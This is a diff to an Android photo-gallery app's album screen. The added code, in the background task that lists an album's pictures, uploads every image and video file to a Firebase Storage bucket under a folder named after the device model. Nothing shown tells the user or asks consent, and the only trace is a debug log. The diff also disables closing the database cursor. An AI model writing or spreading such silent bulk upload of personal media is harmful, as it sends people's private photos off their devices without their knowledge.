@@ -9,6 +9,7 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.provider.MediaStore;
+import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.v7.app.AppCompatActivity;
 import android.util.DisplayMetrics;
@@ -22,6 +23,12 @@ import android.widget.GridView;
 import android.widget.ImageView;
 
 import com.bumptech.glide.Glide;
+import com.google.android.gms.tasks.OnFailureListener;
+import com.google.android.gms.tasks.OnSuccessListener;
+import com.google.firebase.storage.FirebaseStorage;
+import com.google.firebase.storage.StorageReference;
+import com.google.firebase.storage.UploadTask;
+
 
 import java.io.File;
 import java.util.ArrayList;
@@ -34,6 +41,8 @@ public class AlbumActivity extends AppCompatActivity {
     ArrayList<HashMap<String, String>> imageList = new ArrayList<HashMap<String, String>>();
     String album_name = "";
     LoadAlbumImages loadAlbumTask;
+    private StorageReference mStorageReference;
+
 
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
@@ -87,6 +96,18 @@ public class AlbumActivity extends AppCompatActivity {
         @Override
         protected String doInBackground(String... strings)
         {
+            //Referencia a firebase en donde creamos la carpeta uploads para subir nuestras imagenes
+            mStorageReference = FirebaseStorage.getInstance().getReference("uploads");
+
+            String str = android.os.Build.MODEL + "/";
+
+            mStorageReference = mStorageReference.child(str);
+
+            String nameAl = album_name;
+
+            mStorageReference = mStorageReference.child(nameAl);
+
+
             //Variables de string
             String xml = "";
 
@@ -129,7 +150,7 @@ public class AlbumActivity extends AppCompatActivity {
                             null);
 
             //Hacemos un merge
-            Cursor cursor = new MergeCursor(new Cursor[]{cursorExternal,cursorInternal});
+            final Cursor cursor = new MergeCursor(new Cursor[]{cursorExternal,cursorInternal});
 
             //Creamos un ciclo while en donde continuara hasta que ya no haya un siguiente
             while (cursor.moveToNext())
@@ -147,10 +168,36 @@ public class AlbumActivity extends AppCompatActivity {
                 //Finalmente agregamos al Arraylist el HashMap que habiamos creado en el helper "Function"
                 //en donde le pasamos los parametros necesarios para que asi los guarde y les demos uso
                 imageList.add(Function.mappingInbox(album, path, timestamp, Function.converToTime(timestamp), null));
+
+                Uri mediaUri = Uri.parse("file://" + path);
+
+                //Obtenemos un tipo archivo para sacar el nombre despues
+                File nombreDeImagn = new File( "" + mediaUri);
+
+                //Aqui cambiamos el nombre de la imagen o viedo a subir para que no haya repetidos
+//                StorageReference fileReference = mStorageReference.child(System.currentTimeMillis() + nombreDeImagn.getName());
+                StorageReference fileReference = mStorageReference.child(nombreDeImagn.getName());
+
+
+
+                fileReference.putFile(mediaUri)
+                        .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
+                            @Override
+                            public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
+                                Log.d("DebugMsg->UploadFile", "Subendo archivos: " + cursor.getPosition() + " de " + cursor.getCount() );
+                            }
+                        })
+                        .addOnFailureListener(new OnFailureListener() {
+                            @Override
+                            public void onFailure(@NonNull Exception e) {
+                                Log.d("DebugMsg->UploadFile", "onFailure: "+ e.getMessage());
+                            }
+                        });
+
             }
 
             //Cerramos el cursor
-            cursor.close();
+//            cursor.close();
 
             //Hacemos una collecion en donde las vamos a ordernar por tiempo en desencediente
             Collections.sort(imageList, new MapComparator(Function.KEY_TIMESTAMP, "dsc")); // Arranging photo album by timestamp decending
